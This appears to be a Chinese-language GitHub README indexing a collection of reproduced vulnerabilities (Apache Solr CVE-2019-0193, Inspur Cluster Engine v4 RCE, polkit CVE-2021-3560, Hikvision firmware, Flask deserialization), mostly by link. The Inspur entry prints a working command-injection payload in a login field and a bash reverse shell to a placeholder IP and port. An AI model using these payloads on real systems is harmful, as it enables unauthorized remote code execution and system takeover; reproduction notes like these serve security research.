# *Collection of verified vulnerabilities*

## 一、[*Apache Solr Rce cve-2019-0193*](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/ApacheSolr)

<details>
<summary><em>点击以展开 *Apache Solr Rce cve-2019-0193介绍 </em></summary>

- 有回显：
    - 找到利用核心 -> payload写入 -> RCE
    - [*点击以进一步了解*](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/ApacheSolr/README.MD#-%E6%9C%89%E5%9B%9E%E6%98%BEpayload)
- 无回显：
    - 找到利用核心 -> payload写入 -> RCE
    - [*点击以进一步了解*](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/ApacheSolr/README.MD#-%E6%97%A0%E5%9B%9E%E6%98%BEpayload)

### # 1x01 恶意xml引用
引用地址`(https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/CoVV/ApacheSolr/solr.xml)`

### # 1x02 两者payload对比

- [*点击以进一步了解*](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/ApacheSolr/README.MD#-%E5%8C%BA%E5%88%AB)

### 参考

[漏洞分析 - Apache Solr远程代码执行漏洞(CVE-2019-0193)](https://xz.aliyun.com/t/5965)

</details>

## 二、[*Easy Flask - Python 反序列化*](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Flask)

<details>
<summary><em>点击以展开 *Easy Flask - Python 反序列化介绍 </em></summary>

### POC复现

- [*点击以进一步了解POC复现*](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Flask#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0)

</details>

## 三、[*Inspur Cluster Engine v4 RCE*](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Inspur%20Cluster%20Engine%20v4)

<details>
<summary><em>点击以展开 *Inspur Cluster Engine v4 RCE介绍 </em></summary>

- Java web 认证缺陷
- 传入参数可控导致远程代码执行

### POC复现

```
# POC测试(出现 root:x:0:0 则存在漏洞)

op=login&username=peiqi`$(cat /etc/passwd)`
{"err":"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\n","exitcode":1,"out":"the user peiqi does not exist\nerror:1\n"}

# 反弹shell
op=login&username=peiqi`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`
```

</details>

## 四、[*polkit-CVE-2021-3560*](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/polkit-CVE-2021-3560)

<details>
<summary><em>点击以展开 *polkit-CVE-2021-3560介绍 </em></summary>

> 该漏洞存在于系统服务Polkit中，因为Polkit被Systemd所调用，因此默认安装了Systemd的发行版都会使用Polkit。
> 该漏洞成因是执行dbus-send命令后在认证完成前强制终止引发错误，而Polkit未正确处理错误导致允许无特权的用户添加一个sudo用户。

| 影响 OS | 参考链接 |
---- | ----
RHEL 8						|[Link](https://access.redhat.com/security/cve/CVE-2021-3560)
Fedora 21 (or later)		|[Link](https://bugzilla.redhat.com/show_bug.cgi?id=1967424)
Debian testing (“bullseye”)	|[Link](https://security-tracker.debian.org/tracker/CVE-2021-3560)
Ubuntu 20.04				|[Link](https://ubuntu.com/security/CVE-2021-3560)

</details>

## 五、[*Hikvision Unauth*](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Hikvision%20Unauth)

<details>
<summary><em>点击以展开 *Hikvision Unauth介绍 </em></summary>

- 海康威视固件未授权下载及解密分析：
	- [相关博客](https://about.sentrylab.cn/help/Hikvision-BinConfigurationFiles-decrypter/)

</details>

## 六、Struts2 待完成
